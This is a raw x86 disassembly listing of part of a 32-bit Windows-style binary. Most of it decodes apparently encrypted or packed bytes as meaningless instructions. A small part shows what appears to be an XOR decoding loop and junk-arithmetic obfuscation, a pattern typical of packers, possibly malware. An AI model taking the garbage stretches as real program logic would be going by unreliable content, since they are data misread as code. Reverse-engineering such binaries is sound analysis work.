  40314d:	cmp    al,0xc2
  40314f:	push   es
  403150:	dec    edx
  403151:	loop   0x40319f
  403153:	jg     0x403121
  403155:	adc    DWORD PTR [ebx+ebx*2-0x1c],esp
  403159:	rcr    BYTE PTR [eax],cl
  40315b:	sar    DWORD PTR [edi+eiz*4-0x31d4e910],0x6f
  403163:	enter  0x7187,0xfe
  403167:	cs push esp
  403169:	jmp    0x4030ef
  40316b:	fnsave [eax+0x68]
  40316e:	sbb    al,0xd6
  403170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403171:	addr16 stc 
  403173:	or     eax,0xfc292073
  403178:	cmp    cl,BYTE PTR [ebx+0x7ee4f187]
  40317e:	push   ecx
  40317f:	aaa    
  403180:	ins    BYTE PTR es:[edi],dx
  403181:	dec    edi
  403182:	test   al,0x9b
  403184:	mov    ecx,0x2b6f0845
  403189:	sbb    edx,DWORD PTR [eax+eax*1-0x6b7141c1]
  403190:	mov    BYTE PTR [ebx-0x1b21d98a],0x4d
  403197:	mov    cl,0x22
  403199:	xlat   BYTE PTR ds:[ebx]
  40319a:	add    al,0x52
  40319c:	imul   edi,DWORD PTR [edx],0x20
  40319f:	push   edx
  4031a0:	js     0x403186
  4031a2:	and    ebp,DWORD PTR [eax+0x5a0a1fbb]
  4031a8:	in     al,dx
  4031a9:	(bad)  
  4031aa:	out    0x48,al
  4031ac:	pop    eax
  4031ad:	jo     0x403143
  4031af:	dec    edi
  4031b0:	test   eax,0x26e425b6
  4031b5:	popf   
  4031b6:	rol    BYTE PTR [ecx+0xb906a80],1
  4031bc:	xchg   edi,eax
  4031bd:	repnz sar bl,1
  4031c0:	add    BYTE PTR [ebx+0x2077d0b9],dl
  4031c6:	mov    dh,0x3c
  4031c8:	jp     0x4031ea
  4031ca:	and    eax,0xee90e612
  4031cf:	fstp   QWORD PTR [edx+eax*4+0x68]
  4031d3:	shr    BYTE PTR [esi-0x74],cl
  4031d6:	and    al,0xb1
  4031d8:	call   0x4e36:0x26d709ac
  4031df:	add    eax,ecx
  4031e1:	daa    
  4031e2:	rcl    DWORD PTR ds:0xdca1056a,0x5e
  4031e9:	enter  0x6aad,0x59
  4031ed:	lea    esi,[edi]
  4031ef:	and    edi,ebx
  4031f1:	inc    eax
  4031f2:	cmp    eax,0xd2b5462b
  4031f7:	adc    ax,0x5f57
  4031fb:	loopne 0x403243
  4031fd:	lods   eax,DWORD PTR ds:[esi]
  4031fe:	mov    DWORD PTR [edi-0x74653d0f],ebp
  403204:	cwde   
  403205:	dec    bx
  403207:	stos   BYTE PTR es:[edi],al
  403208:	xchg   ebx,eax
  403209:	jmp    0x403195
  40320b:	adc    BYTE PTR [ecx+0x4e],al
  40320e:	xchg   edx,eax
  40320f:	jecxz  0x4031a2
  403211:	fcomp  QWORD PTR ds:0x5fa832fe
  403217:	mov    ah,0x83
  403219:	lds    edi,FWORD PTR fs:[eax]
  40321c:	imul   ecx,DWORD PTR [ecx-0x76],0xffffffce
  403220:	xchg   esp,eax
  403221:	jne    0x40327b
  403223:	and    DWORD PTR [ebx+ebp*4+0x3c883ad1],eax
  40322a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40322b:	push   cs
  40322c:	frstor [ebx-0x7bc05c43]
  403232:	mov    bh,0x7b
  403234:	test   eax,0xedf3a865
  403239:	mov    DWORD PTR [ebx],esi
  40323b:	iret   
  40323c:	mov    cl,0x3f
  40323e:	sub    BYTE PTR [ecx],0x62
  403241:	adc    BYTE PTR [edi],0x77
  403244:	gs push cs
  403246:	inc    ebx
  403247:	aas    
  403248:	loop   0x403251
  40324a:	or     ch,BYTE PTR [edx]
  40324c:	sub    DWORD PTR [edi],eax
  40324e:	test   BYTE PTR [esi+0x8b92b9a],al
  403254:	inc    ebx
  403255:	sbb    BYTE PTR [edi],ah
  403257:	sbb    eax,0x74a843fc
  40325c:	push   esi
  40325d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40325e:	leave  
  40325f:	jl     0x403257
  403261:	je     0x40329d
  403263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403264:	mov    edx,0xc84d3739
  403269:	dec    esi
  40326a:	mov    edx,0x4836ee83
  40326f:	leave  
  403270:	jecxz  0x4031ff
  403272:	jb     0x40325e
  403274:	cmp    DWORD PTR [edi],ebp
  403276:	lods   eax,DWORD PTR ds:[esi]
  403277:	pop    edx
  403278:	cmp    BYTE PTR [ecx-0x718edbc8],dh
  40327e:	cs leave 
  403280:	push   edx
  403281:	and    bl,BYTE PTR [ebx+eiz*8+0x21]
  403285:	xchg   edx,eax
  403286:	fdivrp st(6),st
  403288:	test   BYTE PTR [edx],ah
  40328a:	push   ss
  40328b:	push   ebx
  40328c:	leave  
  40328d:	pop    edi
  40328e:	jg     0x403289
  403290:	idiv   DWORD PTR [ecx]
  403292:	mov    esi,0x4c1a8975
  403297:	pop    esi
  403298:	mov    ds:0xe7107186,eax
  40329d:	test   BYTE PTR [eax+0x303168c0],ah
  4032a3:	out    dx,al
  4032a4:	mov    al,0x1a
  4032a6:	add    al,0x7e
  4032a8:	test   al,0xb
  4032aa:	xlat   BYTE PTR ds:[ebx]
  4032ab:	sbb    BYTE PTR [edi],bl
  4032ad:	idiv   DWORD PTR [ecx]
  4032af:	pop    esp
  4032b0:	je     0x4032d0
  4032b2:	aam    0x2d
  4032b4:	inc    edx
  4032b5:	test   BYTE PTR [edx+0x7b],cl
  4032b8:	or     BYTE PTR [ecx],al
  4032ba:	push   eax
  4032bb:	xchg   esp,eax
  4032bc:	int    0xe
  4032be:	sub    BYTE PTR [ebx],cl
  4032c0:	sbb    eax,0xdf5d8bd0
  4032c5:	sub    DWORD PTR [edi],0xffffffa4
  4032c8:	(bad)
  4032cb:	iret   
  4032cc:	cmp    DWORD PTR [ebp+0x7a],0x6c3c2092
  4032d3:	xor    eax,0x7fb28f6f
  4032d8:	out    0xc0,al
  4032da:	scas   al,BYTE PTR es:[edi]
  4032db:	add    BYTE PTR [ecx+edx*8],ch
  4032de:	int3   
  4032df:	fwait
  4032e0:	mov    ah,0xf5
  4032e2:	ror    dh,0x8a
  4032e5:	pop    edi
  4032e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032e7:	test   al,0xc9
  4032e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ea:	shl    BYTE PTR [eax+eiz*1],cl
  4032ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ee:	and    bl,BYTE PTR [eax+eax*8-0x66]
  4032f2:	pop    ebp
  4032f3:	popa   
  4032f4:	bound  esi,QWORD PTR [edi-0x5e13bfad]
  4032fa:	pop    ss
  4032fb:	cmp    eax,0x14f3fc5c
  403300:	or     esi,DWORD PTR [edx-0x4f]
  403303:	lods   eax,DWORD PTR ds:[esi]
  403304:	jge    0x40332f
  403306:	loope  0x403347
  403308:	enter  0x5cc7,0xbd
  40330c:	cmc    
  40330d:	pop    ebp
  40330e:	push   esp
  40330f:	ss sti 
  403311:	ds retf 0x20fe
  403315:	loopne 0x40336c
  403317:	shl    edx,0xe4
  40331a:	in     al,dx
  40331b:	xchg   ebx,eax
  40331c:	test   DWORD PTR [edx+0x149d28f],eax
  403322:	enter  0x9286,0xf7
  403326:	dec    edi
  403327:	cmp    al,0x63
  403329:	mov    dl,0x26
  40332b:	scas   eax,DWORD PTR es:[edi]
  40332c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40332d:	fisubr WORD PTR [esp+eax*1+0x2]
  403331:	sub    al,0x93
  403333:	mov    al,0xbb
  403335:	sbb    bh,bh
  403337:	pop    esp
  403338:	sbb    al,0x59
  40333a:	mov    al,ds:0xa500c9ab
  40333f:	pop    edi
  403340:	mov    ah,BYTE PTR [eax-0x67]
  403343:	mov    ds:0x9dd56ec2,eax
  403348:	dec    esi
  403349:	jne    0x403322
  40334b:	mov    eax,0x4f92a1c4
  403350:	sub    ecx,DWORD PTR ds:0x6bf06bf0
  403356:	or     edi,DWORD PTR ds:0xfd725c44
  40335c:	nop
  40335d:	adc    bh,dl
  40335f:	sti    
  403360:	mov    edi,0x886955c
  403365:	sbb    cl,BYTE PTR [edi]
  403367:	mov    ah,0x66
  403369:	mov    cl,0xad
  40336b:	sub    ah,dl
  40336d:	call   0x2f1cf971
  403372:	lea    ebp,ss:[esi+0x59]
  403376:	popa   
  403377:	shl    DWORD PTR [ebx-0x27],cl
  40337a:	out    dx,al
  40337b:	push   ds
  40337c:	push   cs
  40337d:	outs   dx,DWORD PTR ds:[esi]
  40337e:	daa    
  40337f:	or     ebx,DWORD PTR [ebx+eax*8-0x47baaa5a]
  403386:	jb     0x4033d0
  403388:	cmp    DWORD PTR [esi+0x31],edx
  40338b:	pop    esp
  40338c:	(bad)
  403390:	jne    0x403350
  403392:	outs   dx,DWORD PTR ds:[esi]
  403393:	jno    0x403403
  403395:	dec    esp
  403396:	shr    BYTE PTR [ebp+0x35],cl
  403399:	mov    eax,ds:0x8758b33
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	mov    esp,0x3aeb84ad
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x403416
  4033c6:	lods   al,BYTE PTR ds:[esi]
  4033c7:	popf   
  4033c8:	(bad)  
  4033c9:	(bad)  
  4033ca:	jmp    0xb912:0x98d37d9f
  4033d1:	push   ss
  4033d2:	ins    BYTE PTR es:[edi],dx
  4033d3:	xor    al,0x37
  4033d5:	mov    BYTE PTR [edx-0x42],dh
  4033d8:	jmp    0xca2b3ef
  4033dd:	xor    al,BYTE PTR [edx-0x7075ec47]
  4033e3:	fisttp QWORD PTR [ecx-0x55]
  4033e6:	call   0xafa8:0x6cf107b1
  4033ed:	fsubp  st(0),st
  4033ef:	jg     0x40344e
  4033f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033f2:	mov    fs:0x3899a949,al
  4033f8:	out    0x71,eax
  4033fa:	cdq    
  4033fb:	and    BYTE PTR ss:[edi],ah
  4033fe:	shr    DWORD PTR [esi+eiz*2],1
  403401:	jbe    0x403477
  403403:	outs   dx,BYTE PTR ds:[esi]
  403404:	fiadd  WORD PTR [ebx-0x283a8dc2]
  40340a:	je     0x4033e9
  40340c:	and    eax,0xd74ad110
  403411:	mov    ecx,0x6f26e45f
  403416:	mov    ah,0x99
  403418:	push   0x3c762ffe
  40341d:	je     0x4033c4
  40341f:	popf   
  403420:	inc    edi
  403421:	inc    ebx
  403422:	nop
  403423:	adc    dh,BYTE PTR [ecx+0x7d669bf4]
  403429:	js     0x403464
  40342b:	repz and eax,0x6e2904ee
  403431:	ja     0x40348f
  403433:	aaa    
  403434:	inc    ebx
  403435:	or     ebx,edx
  403437:	out    0xa9,al
  403439:	cmp    BYTE PTR [ebx],0x11
  40343c:	fcmovbe st,st(1)
  40343e:	in     al,0xdd
  403440:	inc    ebx
  403441:	or     DWORD PTR [ebx+0x3a],ebx
  403444:	xor    BYTE PTR [esi],dh
  403446:	icebp  
  403447:	lods   ax,WORD PTR ds:[esi]
  403449:	dec    eax
  40344a:	jo     0x40345d
  40344c:	and    dl,dh
  40344e:	push   ebx
  40344f:	jae    0x403450
  403451:	test   DWORD PTR [eax],0x67f451de
  403457:	sub    ebx,ebp
  403459:	arpl   bp,di
  40345b:	mov    DWORD PTR [edx+0x4b],0xc47c0d7b
  403462:	dec    edi
  403463:	int    0xa8
  403465:	xchg   BYTE PTR [ebp+0x52],ah
  403468:	add    BYTE PTR [edi-0x6ba58a6a],0xcc
  40346f:	sti    
  403470:	nop
  403471:	idiv   BYTE PTR [edx+0x4227a98b]
  403477:	lock add esi,DWORD PTR [eax]
  40347a:	xchg   ebx,eax
  40347b:	xchg   esp,eax
  40347c:	xchg   BYTE PTR [edx-0x41],ch
  40347f:	mov    ds:0x353aa239,eax
  403484:	add    DWORD PTR [ebp+0x1a],esp
  403487:	pop    eax
  403488:	fsub   st,st(3)
  40348a:	cwde   
  40348b:	leave  
  40348c:	or     al,0x5e
  40348e:	jmp    0xf939582
  403493:	mov    esi,DWORD PTR [esi+ecx*1+0x29aea8a]
  40349a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40349b:	jae    0x403451
  40349d:	and    ebp,DWORD PTR [esi+0xd]
  4034a0:	adc    eax,0x1cd73ada
  4034a5:	pop    ecx
  4034a6:	test   al,0x79
  4034a8:	and    dh,bh
  4034aa:	mov    al,0x3c
  4034ac:	mul    BYTE PTR [edx+0x55]
  4034af:	loop   0x40345d
  4034b1:	inc    edx
  4034b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034b3:	dec    ebp
  4034b4:	jmp    0xee518549
  4034b9:	sar    eax,cl
  4034bb:	inc    eax
  4034bc:	pop    esi
  4034bd:	cmp    ch,cl
  4034bf:	cmp    esp,ecx
  4034c1:	sbb    dl,dh
  4034c3:	scas   eax,DWORD PTR es:[edi]
  4034c4:	jg     0x40345c
  4034c6:	cmp    bl,0xcc
  4034c9:	jecxz  0x403518
  4034cb:	push   ebx
  4034cc:	call   0xea47b2c3
  4034d1:	xchg   edi,eax
  4034d2:	jl     0x4034ab
  4034d4:	mov    cl,0x82
  4034d6:	cmc    
  4034d7:	mov    edi,DWORD PTR [ecx-0x52097c2d]
  4034dd:	ret    0xe673
  4034e0:	jg     0x4034c0
  4034e2:	fst    DWORD PTR [eax-0x20824607]
  4034e8:	cwde   
  4034e9:	sub    ecx,0xbe180986
  4034ef:	jns    0x4034da
  4034f1:	pop    ecx
  4034f2:	pop    ds
  4034f3:	xchg   esp,eax
  4034f4:	ds inc edx
  4034f6:	mov    al,ds:0x730ebef7
  4034fb:	sbb    eax,0x483caadd
  403500:	or     DWORD PTR [ebx],esi
  403502:	cmp    al,0x6
  403504:	pusha  
  403505:	or     al,0xda
  403507:	adc    BYTE PTR [edi+0x51],cl
  40350a:	xor    edi,DWORD PTR [ecx]
  40350c:	fdivr  st(4),st
  40350e:	pop    esi
  40350f:	in     eax,dx
  403510:	pop    esi
  403511:	fistp  DWORD PTR [ecx-0x4e4c84df]
  403517:	adc    bl,BYTE PTR [edx-0x53b9d58a]
  40351d:	mov    ds:0x62e54541,al
  403522:	push   0x1739b07d
  403527:	and    DWORD PTR [ebx-0x67342674],edi
  40352d:	lods   eax,DWORD PTR ds:[esi]
  40352e:	push   ebx
  40352f:	(bad)  
  403531:	mov    DWORD PTR [edi+0x7c],ebp
  403534:	test   eax,0x44104834
  403539:	xlat   BYTE PTR ds:[ebx]
  40353a:	xchg   esi,eax
  40353b:	jo     0x4034bd
  40353d:	cli    
  40353e:	push   ecx
  40353f:	dec    eax
  403540:	and    ah,BYTE PTR [eax*2+0xfcb8444]
  403547:	jmp    0x403580
  403549:	xor    eax,0x4cb7a1c7
  40354e:	push   esi
  40354f:	xor    al,0x84
  403551:	xlat   BYTE PTR ds:[ebx]
  403552:	int3   
  403553:	loop   0x403550
  403555:	mov    cl,0xd0
  403557:	int    0x48
  403559:	push   ecx
  40355a:	jle    0x403561
  40355c:	add    ah,dl
  40355e:	vpsadbw ymm6,ymm3,YMMWORD PTR [edx+0x4406533a]
  403566:	jl     0x4035ca
  403568:	or     eax,0xf963737b
  40356d:	es inc ebx
  40356f:	dec    ebp
  403570:	mov    ecx,0x60a6f144
  403575:	mov    eax,ds:0xf385aa96
  40357a:	int3   
  40357b:	call   0xf33c:0x6e779c1a
  403582:	xor    edx,DWORD PTR [edx-0x1affe62c]
  403588:	or     eax,DWORD PTR [ebp-0x61]
  40358b:	inc    ebp
  40358c:	inc    ecx
  40358d:	pusha  
  40358e:	add    al,0x71
  403590:	xor    dh,BYTE PTR [ebp+0x5d47c115]
  403596:	retf   
  403597:	adc    BYTE PTR [edi-0x27],ch
  40359a:	sbb    DWORD PTR [edx+0x28c34fc4],esi
  4035a0:	mov    bh,0x63
  4035a2:	mov    ebx,ebx
  4035a4:	and    ch,bl
  4035a6:	mov    ecx,0xd93086d1
  4035ab:	iret   
  4035ac:	call   0x37505334
  4035b1:	push   0xd4111f0
  4035b6:	into   
  4035b7:	lahf   
  4035b8:	aam    0x77
  4035ba:	jbe    0x4035fe
  4035bc:	mov    ebx,0x1b5433c8
  4035c1:	and    DWORD PTR ds:0x7b164088,eax
  4035c7:	dec    ecx
  4035c8:	adc    ah,0x39
  4035cb:	sbb    eax,0x90bd167b
  4035d0:	cmp    ebp,DWORD PTR [esi+0x3]
  4035d3:	push   edi
  4035d4:	mov    cs,WORD PTR ds:0x58c036fe
  4035da:	pop    ss
  4035db:	mov    ch,0xb3
  4035dd:	mov    ds:0xc27d1f0d,al
  4035e2:	jge    0x403584
  4035e4:	xlat   BYTE PTR ds:[ebx]
  4035e5:	mov    DWORD PTR [edx],edx
  4035e7:	add    eax,0xd610a68
  4035ec:	je     0x40365a
  4035ee:	stos   BYTE PTR es:[edi],al
  4035ef:	sub    al,0x7f
  4035f1:	pop    esp
  4035f2:	addr16 repnz or edx,esp
  4035f6:	iret   
  4035f7:	and    DWORD PTR [eax-0x1c],esi
  4035fa:	jb     0x4035ab
  4035fc:	mov    WORD PTR [eax-0x77],fs
  4035ff:	mov    dl,BYTE PTR [edi+0x7a76b38e]
  403605:	sub    eax,0xe1fad986
  40360a:	dec    ebx
  40360b:	pop    eax
  40360c:	popf   
  40360d:	sbb    al,0xc8
  40360f:	jp     0x4035bb
  403611:	cmc    
  403612:	fisttp WORD PTR [ebx]
  403614:	pop    ss
  403615:	lock jb 0x4035e8
  403618:	xor    DWORD PTR [ebx-0x33],esp
  40361b:	fadd   QWORD PTR [esi]
  40361d:	(bad)  
  40361e:	stos   BYTE PTR es:[edi],al
  40361f:	pusha  
  403620:	mov    dl,0x25
  403622:	add    BYTE PTR [ebx+edi*2+0x49a0a7b5],ch
  403629:	cmp    dl,BYTE PTR [ecx+edx*1]
  40362c:	cs mov ebx,0xa05843a7
  403632:	je     0x40362f
  403634:	popa   
  403635:	inc    esp
  403636:	pop    ecx
  403637:	mov    al,0x91
  403639:	push   esp
  40363a:	inc    DWORD PTR [esi]
  40363c:	xchg   edi,eax
  40363d:	mov    es,ecx
  40363f:	mov    ds:0xf11f9e0b,eax
  403644:	mov    eax,0x38f46d1f
  403649:	mov    edx,0xedf4d4fd
  40364e:	jnp    0x40365d
  403650:	pop    esi
  403651:	mov    cl,0x7e
  403653:	aad    0x7b
  403655:	adc    DWORD PTR [esi],ebx
  403657:	push   edx
  403658:	sub    ebp,DWORD PTR [ecx]
  40365a:	push   edi
  40365b:	xlat   BYTE PTR ds:[ebx]
  40365c:	jg     0x403654
  40365e:	nop
  40365f:	inc    esi
  403660:	pop    ds
  403661:	push   ds
  403662:	inc    esi
  403663:	dec    ebx
  403664:	sahf   
  403665:	cld    
  403666:	dec    edi
  403667:	pop    ecx
  403668:	add    esi,esp
  40366a:	jbe    0x4036dd
  40366c:	iret   
  40366d:	push   edi
  40366e:	jmp    0x8209efe7
  403673:	in     eax,dx
  403674:	jnp    0x403693
  403676:	aam    0x71
  403678:	pop    esp
  403679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40367a:	imul   esi,ebp,0xffffff9a
  40367d:	xor    DWORD PTR [ebx],eax
  40367f:	bound  edx,QWORD PTR [esi-0x45]
  403682:	pusha  
  403683:	inc    ebp
  403684:	add    al,0x1a
  403686:	mov    WORD PTR [edx+0x729c0384],cs
  40368c:	xor    al,BYTE PTR [eax]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fd6d,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fd6d,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fd6d,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e357
  4036fc:	cmp    DWORD PTR ds:0x42fd6d,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fd6d
  403711:	dec    eax
  403712:	mov    ds:0x42fd6d,eax
  403717:	mov    eax,ds:0x42fd6d
  40371c:	dec    eax
  40371d:	mov    ds:0x42fd6d,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e773,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e777,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd8d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e793,0x42e19c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fdfa,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e1a4,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e78f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ecx+0x78b59b4a],eax
  4037a6:	adc    DWORD PTR [eax+0x70],esi
  4037a9:	cmp    eax,0x6970707d
  4037ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037af:	inc    ebx
  4037b0:	dec    edi
  4037b1:	xchg   ecx,eax
  4037b2:	shr    BYTE PTR ds:0x2e63f9dc,1
  4037b8:	mov    ds:0x12e35a63,eax
  4037bd:	out    0xe5,al
  4037bf:	leave  
  4037c0:	es ret 
  4037c2:	dec    edi
  4037c3:	ds inc esi
  4037c5:	and    edi,DWORD PTR [eax]
  4037c7:	push   ds
  4037c8:	add    al,0xe2
  4037ca:	push   esi
  4037cb:	aam    0x37
  4037cd:	xchg   edx,eax
  4037ce:	dec    sp
  4037d0:	aas    
  4037d1:	test   eax,0xc1782956
  4037d6:	mov    dh,0x93
  4037d8:	(bad)  
  4037d9:	xchg   ebp,eax
  4037da:	fwait
  4037db:	pop    es
  4037dc:	sub    BYTE PTR [edx],0xde
  4037df:	pop    ds
  4037e0:	and    dh,cl
  4037e2:	mov    ?,WORD PTR [esi+0xc5cb8ff]
  4037e8:	sbb    eax,0x2ea22dcf
  4037ed:	lods   al,BYTE PTR ds:[esi]
  4037ee:	jns    0x403860
  4037f0:	btc    DWORD PTR [ebx-0x55786380],ecx
  4037f7:	push   es
  4037f8:	xor    ah,0x67
  4037fb:	xchg   edi,eax
  4037fc:	jnp    0x40381b
  4037fe:	add    BYTE PTR [edx+0x36],ah
  403801:	dec    esp
  403802:	aad    0x1c
  403804:	das    
  403805:	popf   
  403806:	xor    edi,DWORD PTR [edi]
  403808:	rcr    DWORD PTR [ebp-0x6a45821b],1
  40380e:	outs   dx,DWORD PTR ds:[esi]
  40380f:	stos   DWORD PTR es:[edi],eax
  403810:	fdivr  QWORD PTR [eax]
  403812:	mov    bh,0x53
  403814:	inc    ebx
  403815:	adc    esp,DWORD PTR [edi+0x6]
  403818:	add    ah,BYTE PTR [eax]
  40381a:	stos   DWORD PTR es:[edi],eax
  40381b:	mov    al,0xaa
  40381d:	out    0xe2,eax
  40381f:	out    dx,al
  403820:	ins    DWORD PTR es:[edi],dx
  403821:	dec    edx
  403822:	das    
  403823:	int3   
  403824:	pop    ebx
  403825:	adc    eax,0x38eabd68
  40382a:	mov    ebp,0x63f3aca
  40382f:	ins    DWORD PTR es:[edi],dx
  403830:	sub    eax,0xea00e469
  403835:	into   
  403836:	jb     0x4037ec
  403838:	in     eax,0x89
  40383a:	jnp    0x403803
  40383c:	popf   
  40383d:	mov    esp,0x2029f939
  403842:	push   0xfffffff6
  403844:	inc    edx
  403845:	cmp    al,0xb2
  403847:	mov    ah,0xc7
  403849:	cmp    al,0xcb
  40384b:	scas   eax,DWORD PTR es:[edi]
  40384c:	sbb    al,0xc4
  40384e:	mov    dl,0xbd
  403850:	and    esi,DWORD PTR [ebx+0x1939ac76]
  403856:	or     DWORD PTR [edx+0x298958af],esi
  40385c:	call   DWORD PTR [ebx-0x7af1b6db]
  403862:	pop    edx
  403863:	in     al,dx
  403864:	pop    edx
  403865:	mov    ecx,0x10f3e728
  40386a:	lock push eax
  40386c:	ret    0x27a6
  40386f:	(bad)  
  403870:	cld    
  403871:	cs mov edi,0x710ad3db
  403877:	das    
  403878:	jle    0x40385b
  40387a:	pop    eax
  40387b:	mov    al,es:0xf3b85e5a
  403881:	arpl   WORD PTR [ecx-0x7c],bx
  403884:	cmp    BYTE PTR [edx+eax*1],bl
  403887:	es das 
  403889:	dec    ecx
  40388a:	fimul  WORD PTR [ebx-0x7ab8cf6b]
  403890:	jmp    0x9fa8b3b7
  403895:	ja     0x403836
  403897:	call   FWORD PTR [edx]
  403899:	dec    BYTE PTR [edi-0x5b]
  40389c:	pop    eax
  40389d:	sar    DWORD PTR [ecx-0xb],cl
  4038a0:	jp     0x403880
  4038a2:	push   ebx
  4038a3:	sbb    eax,0xedf4bb8
  4038a8:	jle    0x403890
  4038aa:	pop    ecx
  4038ab:	cwde   
  4038ac:	aad    0x4e
  4038ae:	sub    ch,bl
  4038b0:	push   cs
  4038b1:	mov    DWORD PTR [ecx+0x1b],edx
  4038b4:	add    eax,0xb1d7f8a6
  4038b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038ba:	cmp    al,0xbc
  4038bc:	xor    DWORD PTR [ebx-0x5d416931],esi
  4038c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038c3:	xchg   bh,bh
  4038c5:	scas   eax,DWORD PTR es:[edi]
  4038c6:	jg     0x403944
  4038c8:	inc    esi
  4038c9:	push   ebx
  4038ca:	sar    ah,cl
  4038cc:	mov    ecx,0x94131cd7
  4038d1:	jge    0x40391b
  4038d3:	js     0x4038a2
  4038d5:	out    0xef,eax
  4038d7:	jp     0x403934
  4038d9:	call   0xe72a80bc
  4038de:	fmul   DWORD PTR [edx+0x412cb52b]
  4038e4:	inc    ecx
  4038e5:	int    0xd
  4038e7:	and    al,0xf0
  4038e9:	arpl   WORD PTR [edi],bx
  4038eb:	mov    dh,0x3e
  4038ed:	pop    es
  4038ee:	mov    edx,0xc6abb721
  4038f3:	out    0xa1,al
  4038f5:	jmp    0x483170bd
  4038fa:	icebp  
  4038fb:	sub    eax,DWORD PTR [edi]
  4038fd:	xor    ah,BYTE PTR [edi]
  4038ff:	mov    al,ds:0x8da99a8a
  403904:	lods   al,BYTE PTR ds:[esi]
  403905:	push   0xffffffd9
  403907:	in     al,0x4e
  403909:	sbb    al,0x99
  40390b:	adc    dh,BYTE PTR [esi+0x5c]
  40390e:	in     al,0x7d
  403910:	cmp    BYTE PTR [ebp+0x7a],ah
  403913:	(bad)  
  403914:	enter  0xbb,0xfb
  403918:	jmp    0x403910
  40391a:	or     al,0x48
  40391c:	in     eax,0x82
  40391e:	call   0x4b28b125
  403923:	daa    
  403924:	push   0x2c59030d
  403929:	stc    
  40392a:	xchg   esp,eax
  40392b:	and    ebp,DWORD PTR [edi]
  40392d:	es test al,0x10
  403930:	mov    eax,ds:0x1ba1c3bc
  403935:	scas   eax,DWORD PTR es:[edi]
  403936:	out    dx,al
  403937:	cs pushw cs
  40393a:	pop    edi
  40393b:	push   cs
  40393c:	icebp  
  40393d:	xor    edi,DWORD PTR [edx]
  40393f:	mov    eax,0x84112fa2
  403944:	inc    ebx
  403945:	cmp    BYTE PTR [eax+0x732dff1a],ch
  40394b:	sti    
  40394c:	enter  0xbac9,0x75
  403950:	push   esi
  403951:	inc    ebx
  403952:	xor    ebx,DWORD PTR [esi]
  403954:	ror    edi,cl
  403956:	dec    ecx
  403957:	aaa    
  403958:	sub    ah,BYTE PTR [eax+0x7bd68a37]
  40395e:	test   DWORD PTR [ecx-0x45bb1996],ebx
  403964:	sbb    eax,0xbb282583
  403969:	cdq    
  40396a:	pop    ds
  40396b:	or     al,0x76
  40396d:	int3   
  40396e:	mov    esi,0x7c954001
  403973:	pop    eax
  403974:	push   esp
  403975:	dec    ebp
  403976:	push   ebx
  403977:	jne    0x403919
  403979:	call   0x4b6b:0xf61f9c9e
  403980:	xlat   BYTE PTR ds:[ebx]
